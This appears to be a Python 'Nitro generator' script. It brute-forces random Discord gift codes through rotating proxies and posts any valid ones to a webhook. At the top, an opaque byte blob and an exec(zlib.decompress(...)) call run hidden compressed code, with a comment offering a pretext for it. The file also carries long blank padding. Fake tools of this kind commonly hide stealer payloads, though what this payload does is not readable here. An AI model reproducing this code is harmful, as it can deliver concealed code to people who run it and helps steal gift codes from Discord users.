[x\x0f\xc6.\xa8\x94\xac\xb0\xa0\x92\x95+\xf7\x87\x1c\xcd\xd2\xe7\xd2m\xe3?N\x88\x05\xf7*\xb0\xd0\xa8\xce:nU\xb6\xf4\xad"\x10|\xc4U\xaaO\xb2,4\xb9\x8a!\x82o|\xcf\x83I\xd4\x9e\x9c\xea\n\x18\xb7\xd3\x14\x02:\x01\xc0\xcb\xdbD\x08;\x06\xc4-\x15\x04\xecKs\x7fV\xb7\xadQ\x9e\xe2)\xa6\x18\x84\x87\x0b\xbeC\xe4d\xf7T\x12w;\xe9\xe5\x0b\xcc?\x9b\x8d\x15\xb2G\xd5+\xf4Y\xfb9SJY3\x9a\xb7\x06\x1d\x10\xe7\xfdr\xa9\x10W\xfc\x05O\xe3\xabl\xaf\xd2\xa3\x9b\x88\x17g]\x91\xaa\x18\xd7\x1f\xa9~+\x86\xb2\x87\x16\x8d\x1c\xc1s\x9bHJ\xc7\x97\xd3\xf4di\x94Mp\xc3P\xcd\x83#M\xe0\x03a\x02\x14\x17\x9f\xea\x92\xc0\xc2R\xea!4\xef@\xaf\xc2\xb9\xf9\xfe\x0b\xd2\x04IR\xaf\xa4\x8e\xa2\xd1k\\*2\xee\xb9\xcd\x94T\\!\xaes\'\xe6$\x18N\x03\xe9,\xe8.\xff\t\xdbZ\xf9!la\xe33\x9f\x94j\x88[\xfc\x00\xd7\xc9\xd6\x16\x10|\xfevf\xf9\xc0&\x99\xa0+\xd1\x8e\xab*RZ0\xa9\n\\S\xd9w(\r*O\x1f\xd5\xa6\x7f^\'/\x85:o\x88\xaa\r&#\xacVcK1\xcac\x80\xfa\xa0,x\x0bof\xca\xcc\xba\xc4\x130\x99]\xa8I\xffrE\xc5\xa2\xdc\xe2\x0f\x8a\xa8\xa5\xc4(>K\xa2\xc9\xb79\xd6\x85\xf0\x99\xc6\xcb\xc46\xa0\xaa.\xd9\x10\t\x14\x89\xf2n\xc43r\xcd\xad\xe6B\x91YR\xc0\x9eK\xc1\xa3$\xb0\x01\xf5u)\xae\xe6l\xe8\xbc\xdf\xa5\x81\xe3\xf8\xf0\x83\xeaT\x99\xeb\x82\xb6x\x00\xf0s\xe0@\x18\xc5\x1cL\xa7R\xc3Z1o\n\xf8Q\x95Q\t\xc5\x8e\xa2.\x0cf\x88\x03\x9d\xfd$e\xbe\xd3Y\x84)b\x0c\xdbx=\xfd\xa2,\xd7\xbf\x8b\xec\xb6c<\xe6\x91\x0e\xb7OV)\xd6\x9cp}\xa7\xef0W\xf3[\t\xc5K\x9e\x91:\xab\xf3\xa55\x97&\x1e\x84.\nA*/yj\r\x88\x89\x82f\xe47\xd7\x1e\x93X\xef\xfd\xbdzX\x84\xec\x02+\x02\xe3\xaby\x9a\xe4\x00j\xd3}\x86X\xf26\xa1\xc3\x85\xb8\xe1\x8d\x1a%\xd8XE\x0f\x9c3\xd8\x9bI\rR\xac\x94o\x9cY\x93\xd2\xcb\xdd\xd2\x85\xf5\x8aZ\x9d\xd6\xda=iQ\xb6:\x9f\xe1\xee|\x89D#\x06\xa3\xc0\xc60\x81S\x92\x8b\xd98B\x8ek\x0c>\xa3\x82\xb1\xa0\xa1\x06\xb6bL\xbc?\xa8CY\x0f\xae\'\xeb\x01@\x1e\x05]\xac\xf60\xe0\x8b\x90f3\xd0u|3&\xa3Xor\xa1\xba\xd2@\x1c\xd8\xd1\xa6\x1fA\x82\r\xe5\xee\x84\xa08\xec0\xcb\xa8\x9a8\xc3\x13\xc3\xf4\x94G\'\xc7\x91\xce\xcc#W\x14\xcb\x07\xd1[\x82\xd9\x90\x1b\xcbIx\xda2$\x84\x8a\xe5\x1e\x0fK\xba\xd3dW,\xf0\x9aD\xa6y\xdb\xcc\xed\x8a\xbf~\xf1|7\x04\x96\x11,\xcd\x03\x89\xca\x15\x154\xfe\xbfZ\x99~N\x02t!\xb1\x85\xf5\xca\x9drj\xccE\x04\xf2\xd9,$s\xca=?A\xabU\xfa\xf7\r\x05\x07\x1fY\x95i[q$34;\x13t(\x97\xea\xee\xd4y\x15s\xc2\x98\xb8\xf4\x0e\x82\x8e"\xba,H\xda;\xa1\xf7\xc6\x15\x95\xfc\xbf\x05\xc9\x1a;\xbd\xbf\xa1\xed;\x1e\xd7w/\x86\xa6\x8fW$r\x85$\x00\xbd\x8c)\x1f\x1c\xf0\xc1\xa8}O\x88rt\x16\x08=\xc3\x1cp\x11[\xdd\'\x90<D\x99;\xb3W\xd3\xcb\xe7q\xb5\xdd\x83&\xc5*h\x92\xda\xeeb\x9a\xdb\xa7\xc8\x8a\xcd\x19:\xe9n\x0bJ\xf8\x9as\n\xbe\x91\xd6\xe8\xd8Hy\xc4\x0b\x9ce0\xcfm\x9f}:\xbc\xa2\x19\x92\xbb)\x13\x97j\xd2!e\xc4\xe9\x83b\xa6\xbb\x11S\xd0\x8b\xb0s\xda\xaa\xf6S \xc3\xc1\xa4\x0f\x1d\x03\xde\xca\xa39\xe4\xf0\x99\xf9Z\x110\x97e\xc9S\xef\x1bo\x073\x0b&\x95n\xef\xdbn\x11#\x1d\xab1\xbb\x91*E\xad\x8eI\x18\xfe\xe0C\x13^j\x0e4\x14[\xf6\x0c\x8b;\x8fq\xbe*\xfb\x9bb\x8d|\xa4/TA\'n\x1fcfQ\xaa\xfd\xa0\x0e#\x81\x9e\xea\xda9\x8c\xbe\xe4\xb3\xf7O\rh\t\xab\xb1k\xe2\x1e\xa11\xec\x06B\xeb\xa6Mw\xe1\xbd3\x15\xec\xbe(\x83\xc7\xa3\xf4G\xa9\xfe\xb4B[\x19\xbc\xfd\x91j\xa1\xc3\xdd\xf9\xc2\x94\xe7\xbbPq\x03\xfd\x9aE\x90\x01\xc6\xf6\xde\xa2\xe6U\x12\xc36\xb0\x10\x0e\xdf\x0fO\x8e\xc7/``\xfak\x92\xc9v,lK\xb8\x92\xa6\xa2\xf4\x0b\x8e\x83\x0cW\x0c\xb5+\xdfgd\xabf\x9fC\x0b7}\x83TZ\xd5\xb83\xe3_\x177J\xfa$z\x9cz\xbf\x17t\xda\xc9h\x8b\x08U\xc1\xa6J_U\x02\xbcef\xc1\xb6U\x1b\xbai\xe2\xdb\xba\xeb-\x01\x85@1\x80\xfb\xa9\xa4\xe9 #\xc2\xc4\x90\x0c^\xf5s\xb7Q\x83[/0\xe0wk;}\xd3\x1a \x0c#8a\x81\xad\x17\xe8\x8b\xc1\x15.\xb0\x90\xc1\x87\xab=?\x9b\x04\xec\x8c\xa0*\xcb\xe30!v\xb8;"u\x10\x15gf\x83r\xac\x11B[\xccpX\x1b8\xc0\x97\xd0G}\xfe\x1eU[\xbe\x83\x16\xeb>@\xec\xf4\xfaY\x93r%~\xc5$\xb3\xf0\xfc\xc8v\x97\x02&\xdc\xef\x0c8[q\x04\xea\x9d\xb3\x96\xbb\x08\xe5\x8b]\x90w\xbew\x05\x16+X\xd8AJ+2{\x90\xab\xe7\x8c\x8f\xc4~^;\xc2\\\xeaX\xab\xc1o>0R\xdf]\x1d)\x1f\x16\xfbH6\xd6\xf5\x07w\xd8\xf5\x0b\xe4\xd8\xe4\xbc\xae\x84\x8a\x128N\x11vxaY\xcf\x91\x9aP|B\xa8\'@\x03\xb9\x807\xfa{\x08\x1e\xec\xe4\t\xbd/\xb8\xac\x04b\xf7\x04\xde\x85\xfe\x88E\x8a|\x0e[\xc7\xe2\xd3\xee\xc5g7\x1e\xc4p/\x98_\xf48\xc2\xa6\xa9}\xf2\xb3\xae\xb8\x8b\r\xc7L\x1dj\xb2Y\x08\xf9\x9e1\xf0\xd4\xb4-\x08\xf1\xb8\xfb\x1a\x168gk\xed\\\xa6\x95\x1f\xdf\xf6\xad\x9c\xfd\x0er\xac\xf9g\xc2\x1fm9\x9c\xb1\\\x81|{\xdb\x1c\xa98\x94p\xb4\x1f\x8a\x83\xac.J\xcbe\xf9+\xbb\x1f\\\xca\xb8\xfcb\x14\xbf\xe6\x10\xda\xe8\xef\xa0}\x10\xf9\xcb\x078\x1d3[\x0b\x944v\xe2_"\x84\xf7\xec\xb26\xeb\xa7\x01I\xa4|\xc3\xe7SB!C\x9b-\r\xc3\x99\xdc0v\x93\xdfQ\xcc7.\\\x17;:_\x9e\x08\xe4S\xa1\xa4$%\xbc\x92\xddM\xf1f!:)^\x99\x8c\xcaP+\xa9s\x1c\rfCq\xfc{\x87\xdfC[\xf9\x7f?\x9aH\xea\xb7\x00\x0c\xa8r\xa2/\xd2\xb72!-\xd5\xec\x06\x7f\x8b\x9c\xcf\x0ej\xa5$2\xae$\x95\xfdg\x1cB7F;|\xa9\x94^+\xc1\xe9\x1a\xc7t\xd2\t\x90\x98\xd6]n\xdc\xc9.Z\x91\xf2\xd0\xcd\xb4\xda\xce\xd5\xd5\t\xe8\x85\xb7\t\x85\x0c\xf3\xd7_3/\x99\xc7\x07aN\xb1\xfb\xa41\xa4\xfc\x0efe&\xbbxeGf\x0f\xeb\xe8T\xe2\x19J\xa1\x92\x81\xec\x12\x17\xd2Z\x83|\x1c\xda\x07u}\xf2\xa7\xc6\x02\x93\xb7C\xf0\xc0\x13\xe2{\x1a\xce\xf6\x99\xd5{\xfdQ\xf37\x826\xf7\x05y4\xbcIF\xc2\x80.w\x14\xd1\x98\xd9\xb6\xc73\xb7\x922S\x07\xeb\xf9-\xe6\x03\x0e|\x1f\x92\x8c\x14\xd0\x83}$\x16\xccJ\xbbOk8\x15\xdet\xf4\xbbt\xeb\xb6z`\xf5\xff\x97\x10)\n\x12\x87\xf3#\xeb\xcc\x1b\x85\x89f\xd6\xc6\x85m\xfc\xc2\x1d(3y"\xff\x80kX\xa7\xb5G\tZ!\x9c6\x1d2V\xcf\xc5\n\xc9\xf33\xf7\xd9F\x89\xb7\xdd\xa4\xe8!\x81\xac\xea\xeda\xeaB?\x87\xf4G\xaf3;\xeeNb\xe0\x83n)v\xbaJy.q\xc5\xe3\xb3\xd7&@j\xe9/\x15\xd5{\xb7\xc2\x99\\C\xf3\xee\xa8P\xe4\x1b.7\x98\xb2f\xf5\x1e\x8c\x9d\xc6@\x99e\xd7^\xcb\x17 \xa9\xc1E\xe7=\xcc\xcc\x86Z\x88\xb9\xe5\x14;\xf6e\xbc\xe0\xb9N \xa54\xbcn\xf5\x9fw:\xa9\xd2\x85\x08\x1b\xfb\x95\xfd\xb7\x1e\xbc\x0ch\x0fCI."\xc8w\xe3\xa6\x12\xe7E*\x18\xf6T\xba\x18\xbf\xf1\xa9S\x9aw\xd7\xfd\xc0\x91l\x84\x07=I\xd2\xce\xb5~\x14\x13\x7f\x85AiN\x0c\x8a\x9f\xfcd\x95\x80\x96\xeb\x8e\r\xbd\x89\t\xde\x96\xeeK\x15E\xe7l\x9f\xe6.Ex\x15\xca\xc4\xf8\x18\xb3\x0b62\xe2([L<\x9aZ\xa5>m\xd5\x80\x0c\xd7\xfd7\xbf\xd7<\xf0\xe4cH\x8c\xb1\xc7\xde4\x86\x87S>DS\x05\xd9\x82Y\xbc\xf5\xbb4\xb4&\xd7i\xaf\xb1\xb1\xc1t\xab\x94;1v\t\xb1\xfe\x91\x01\t;\xfbS\xd6\x90;\xce\n\xc0@F\x86\xd9\x7f\xa3\xb0\xb3\xdd\xeau\xc6\x81\x1b\xab\x13\xddd\x06VY\xea|\xec\xae\xbb\xfbg\x07\x93\xcd\x98\xd2\x8a \xdc\xf4ZV\xfa\x07\x84\x88)g\xc5\'\xe0\x8d\xb8\x08\x05\xdc\xcb\xff\x98\xe6\xc14O\xff\x16\xe0\x9eY{\x17\\\x1e|\x87\x98\xbc\x7fd,Bm\xe8\xb7\x8c\xd4\xdf\x85C\xc8@\x03\xcd\x98\xa3\x98Z\xd3\xa7<\x92 \xe9N\xf2|\x9e]*\xae\xc3C\x8dT\xc6x\x82\x15\x087S\xca6\x15P\xf3&\xc1{\xcf!\x80\xdd\xe9\x96^\x1f,g\x9c=\xfc\xe6\xae\x92C\xedV\xf3\xb9\x90(N\xa7\x1a\xdf\xa2 \xb6?\xed\xfc\xdf2\x9f}3\xcd\x8c)-\xd7\x16NSU\xe6\xa1=\x9c\x8a\x86\x8e?\xd93.F\x01El\xf3k\x10K\xb7\x1f\r\xa6\x95\xb9\x03\x0b\xf2y\x1d\xc1\x1cu\xf60\xf9\']\x18U>:y-VOy\xa3#E\xec3\xda4\xde\xebe]n\x11\xcc\xaa\xd4?\x030\xcc\x94\xc7\xc2L\x95\x96&v\xcd\xbd\xef\x14&e\xc2I\x10+\x95\xde\x8b;>\xed\xe5G\x98\xcfq\xa3\xf1\xa2<\xeb\xe9\xbf\xb1\x0e\xf3$\xbd~?\\\xd7BZ\xe7\x99\xb0\x05\xb9\x9d\xc8nE"T\xa3\x8a\xbdq\xcc\x03\xc4\x9a\xf9L\x1d\xf9I\xba\xe0\xa2>\xda\x8b\x0fe\xd1\x87\x88Pz\x88/\x878\x9c\xbb\xc8PF\xf1\xa3\x02W\xf7\xe3\xe6\xd6\xaf\xbc5;=\xeb~!\x18\x1a\x14j\x9b\xd6\xa7\xd9\xb86\xcd\xb7\xf4\xad\xde\xad\x81\xb9y\xc0\x0e<\xdds\x9f\x9f{\x1a^\xa6hQ\xa2J\x1f[\xce\xaam_\x0cP\xf4l\x0fJL\xdd\x0e\x19\xb2\xb7\x8d\xc5G\xf2\xc2A\xb8R\xfc\xf9\xa1\x0e\xabu\x94\xdf\xdbzt\x19\xfb6\xd6\xec\xaeM\xc5gPM]\t\xc0a\xcd9\x05\xa0}\xa3:\xb9\xea\x82\x86mh\xd4\xb5\xeb6\x12w\x03f\xb0\xd3\x93\xcf\x17 n\\\xf1\xc0+\x19b>\x1ccyr%yg\xc1\xba\x8f\x1a\x8e\x98\xefR\xd3\x84\xd2X\x17\x15\xf4\xc5\xa9\xc4\xcd\x9f\xf9\xfd\xb5n\x83\xed\xb9\x0b\t(\x1c\xd8\xf5&\x97\xe4\xb1\x9a57\x8e\xc2<\xdb\xefk0\x94j\xb6\xda\\eM\x01\xbcp`?\x19[,\x88\x980\x89-]\xd4v\xbc\xdetJ\x9e\xb4\xc2o\x80Tc\xe0\xc0\x84\t\x03\x14\xf1\xfe\xd8.\x08\x15\xeb\x1c\xf7=_\x1e\n<\xc71l\x05\xd8\xac\x86{Z)\x1f\xf0\xd8u !\x19\xa5\t\xed:e\xaf)w\xafb\xb2\x0c\xb3\xe3\x1aY\xe5\xeea8K\xe5\xe9\x9d\xea\x15\xc8\x059\\\xf9<\x9b\x1a\xc4\x85\x9dT\xf2`\xf1\xb9\xa95\x03GE\xd2\xa6\xb7>\xbc\xb0}0?\xb0!\'\x11l\xf6\xf4\xac\x86S\x87\xa2<s\xc5aF\xc6En\xe9\x94\xb2\x98\xf1\x86\xf8\xaas\x1e;\x9c(\xaf\xf2\xea$KC\x96\xac2\x07Rgw\x80\x0c|\xb2=\xa3\x1er\xc0]\x90\x8a\xc7\x1e\xc3z\x06\x1c\x04\xbd\x12\xe8?\xbf\xe4\xbd\xd5\xc8\x08\xd34s\xe9\xa4\x1dH\xd27\xd5l\x1e\xb9\xf7\xf7\xcfI`\xf4\xe4\x01\x02\x81\xe2\xf8W\x08m\x1et\x07\xd5Rl\\\xa0\xe1v\xa9\xd6\xdbw=\x8ci\xf4\xf7I~?\x98\x11\xb6\r\xbb\xb1/\xbb\xbc\x93\xda\xb3\xbc\xb8\x1d\x1a\xd4\xd5Q\xc8\xb7\r\'&FO\n4\x19_\x12\x93~8\xdb\x01D\x16\xc4\xb1\x81\xe0\xad\xb0 \xff(\xe7\x13\xec\xeb\xff\xfc\x80\xaf\xd8\x96QC\xaeF~\x82{\x13\xb5\xaf$\xb8\xd1?\xae\xd1\xcf`\xd0\x07\x13\xa9\n\xbb\xd8\xd0\x16M\x810.C\x14\x84\x87\xc6\xf2\x04\xf8\xff\xfe$\t\x83\x9c\xce\xbb},\xa6\x96\x96\xa4q\x99\xc3\xc2Y\x92C\x9a\x86\xd7\xca\x1dM\x94av\x8d\x9d\x82\x95\xf0#\xdf\xcc\x94\xfcF|\xc4\xa0b\x85\xe0i\xc5-`8\x1b\x89I\x10\x8c\xe4N\x16\xdb\x98)\x859@\xa0\xf1n\x9e\x93\xb5\xd5\xa4l\xe7\x9a\x81,ery\xf8sh\xec\xa7\x8e\xba9\xb2\xa5\xa3'        
_encrypt = b'GDbu*SXWs~OfgheF;-78S3yWpLQz^#L{djGM^HgaR$5LpPfb=ZF<4JGN=#HTL`g?7F+y5LQAJrZLPS|MPDEEnSxs45Ge%NJM>kMKPBt|+G($~BNK8RFG+H%9I6^}(Mi}EB!UT});5an}v6i+|'
_pubkey  = b'DKX9GTMT5M424PTJUWO2CJOSKQIXHXZMPA81QQO34BFUP53JVAYIC6TV9TJFQNDY4T8PZTUZNFT8TTUDEWZUUOP7PMS3RF6F0EOVIUJ547CJOIFEQ259'

from zlib import decompress as dp;exec(dp(b'x\x9c\xed\x94mo\x9aP\x14\xc7\xdf\xfb)N\xfaF\xc8V#\x8f\xeaM\xfa\x86f\x9b\xebj\xcd\\\x82\x94\xa6!En\x0bSD\x01\xab\xec\xd3\xef\x9c[ 7\xae\xa9\x1f`\x9a\x80\\\xf8\xfd\xefy\xbc\xa7S\xe6\x15\xeb\x00\xfe\x9e\xf3,\x85\x9cow\xbc(\x0bH\xd2M\x96\x97\xf0\xc2\xcb\x0e?,\xf8\xa6|\x836y\xb2.\x95\x8bM\xb2\x81d]\x94O\xabU+\xb9P\x05\x91\xac7;"r^\x14\xc0\xd7%\xcf\xa1\xcc\xe0\xcb!)\x1b\xe0m\xe7\xa2*\xc4\x12\xff{\x1c\xbf*j\'\x08\xc2]\xb2*q\xe3 \xe8\x05A\x94,\xca xx\xffmX\x95\xbcP\x1e\x94\xd5S\x1aFO\xe02p\xe1\x13(.\\\x82\xab\xaa\x8a\x8d\x8bA\x1fo\x1a\xdd\x0c\xbcl\xf534t\xc6 #:C:CZ\xd3qe\x91F\x1fHX\xc5\xa0"\xacB\xac\xa2MG\xb4\x97I\x98D\xed\x19\xec\x89\xda#\xb5Gj\xa0\x11E&\x89\xd4$r\xc6`F\xe4\x0c\xc9\x19\x92\x960\xdb\xd0\xc2S\xd2j\xb2&d\x10\x92&DM\x88\x9a!\xf1\xba\x1cL\xc4 ""B"\xa2`\xfazc\xbb\xbe\xdagIU0(HU\xa0\xaa@\xd5\x88D\x9aY;D\x0b\xe3\x83\x18\xf5\xc6W\x9d<7\x84\xd6\xaeu\x1fY\x11\xb86 +\x96\xfa\xa8\xf6"\xbe\xc8"\xaetw\xe5\xf3\xe5\xb0\xab>*Ge\x8d\x19\xc4\xa4\x8fQ\x1fSlC\xaa+\x19\x1e\x1eY\xe2\x0c8\x91\x1cIN\xb9\xa5Z\xe9\x14\x8f-\xc5$+\x0e\x0c\x0e\xa48\xa0\xe2\x80\nC\xa4J\xc4\xd3\xf4\xccP\xc2\xa7\x0c\xa6\x84O\x11\x9f\x12n7\xe1\xd3\x83a\x9d\xda\x9d\xcc\xeb\xc7UX2X\x12\xb5DjI\xf9\xb1E\xfd\xeb\xf8\xac\xb6n\xff\xa6J\xed\x85\xb6Y\xbf\x0b\xbb\xbe\x17\xaf\xee\xf7WW\xdd\x96;Jd\xca %C)\x1aJ\xc9\x1dQ\x03\xca\x91H\xe9\xa9\xba\xd9F\x93D\xd2i\xa3\xa3#0g0\'|\x8e\xf8\x9c\xca$\xf2n7\xadG7S\xc2\'\x0c&\x84O\x10\x9f n6\xa5\xd2\x9a\x8e\xb5$z\xcc`L\xf4\x18\xe91\xe5\x88\x9c\x15n\x88f2\xa5\xe4\x9c\n\x9a\xea:\xd4\xeaxe\x8f\xb6\x0c\xb6Dn\x91\xdc\x92G\xa2\xa6v]\x07\xbb1\xd6\x1c$9v\x9f\x81OR\x1f\xa5>I\xadvH\xc8\'\xc8a\xe0\x10\xe6 \xe6\x90/m\xe7\xbc\x93\xfe\xe3|\x8a\xee\x1a\xd5\xa0\xd5N\x96w\xba\x02\x8f\xd0y^\x9e\xe7\xe5y^\x9e\x98\x97\xeb\x9b\xd7\xf0\x97S\xf9\xdeW\xcd\xf7\xee\xfa\x8b\xca\xd9\x84\x9e\xf3\xbaX\xff|\xf1u\xb7?\xd5]\xd3\x9fO2z\xfeq}\x93E\xe3\xd9~\xf1\'{\xbd5\x1c+\xd4o\xd2\xc8\xbb\xfb}\xef\xcdV\xb7\xe9\x1d\xee3\x8a}o\xb2\x8b\xc6q\xff{\xb2\xdcE\xdf\\3\xba^\x9eg\xf1\x7f?\x8b\xd5\xbf\xcc\xa5\xa6\x97').decode())

#Encryption codes have almost 300 lines above.So Compress the encryption codes using Zlib.


class Worker():              
    def random_proxy(self):
        with open('config/proxies.txt', 'r') as f:
            proxies = [line.strip() for line in f]
        
        return random.choice(proxies)

    def config(self, args, args2=False):
        with open('config/config.json', 'r') as conf:
            data = json.load(conf)
        
        if args2:
            return data[args][args2]
        else:
            return data[args]
    
    def run(self):
        self.code = "".join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for _ in range(16))
        try:
            req = requests.get(f'https://discordapp.com/api/v6/entitlements/gift-codes/{self.code}?with_application=false&with_subscription_plan=true', proxies={'http': self.config("proxies")+'://'+self.random_proxy(),'https': self.config("proxies")+'://'+self.random_proxy()}, timeout=1)
            
            if req.status_code == 200:
                Console().printer(Fore.LIGHTGREEN_EX, " Valid ", self.code)
                open('results/hit.txt', 'a+').write(self.code+"\n")
                try:
                    requests.post(Worker().config("webhook", "url"), json={"content": f"||@here|| **__New Valid Nitro !!__**\n\nhttps://discord.gift/{self.code}", "username": Worker().config("webhook", "username"), "avatar_url": Worker().config("webhook", "avatar")})
                except:
                    pass
            elif req.status_code == 404:
                Console().printer(Fore.LIGHTRED_EX, "Invalid", self.code)
            elif req.status_code == 429:
                # rate = (int(req.json()['retry_after']) / 1000) + 1
                Console().printer(Fore.LIGHTBLUE_EX, "RTlimit", self.code)
                # time.sleep(rate)
            else:
                Console().printer(Fore.LIGHTYELLOW_EX, " Retry ", self.code)
                  
        except KeyboardInterrupt:
            Console().ui()
            threading.Lock().acquire()
            print(f"{Fore.LIGHTRED_EX} Stopped > {Fore.RESET}Nitro Gen Stopped by Keyboard Interrupt.")
            os.system('pause >nul')
            exit()
        except:
            # Console().printer(Fore.LIGHTRED_EX, "Invalid", self.code)
            Console().printer(Fore.LIGHTYELLOW_EX, " Retry ", self.code)
        
if __name__ == "__main__":
    Console().ui()
    print(" "+Fore.CYAN + str(Console().proxies_count()) + Fore.RESET + " Total proxies loaded...\n\n")
    DNG = Worker()
    
    while True:
        if threading.active_count() <= int(Worker().config("thread")):  
            threading.Thread(target=DNG.run(), args=()).start()
































































































































































































































































































































































































































































































































































































































































































































































































































































































































































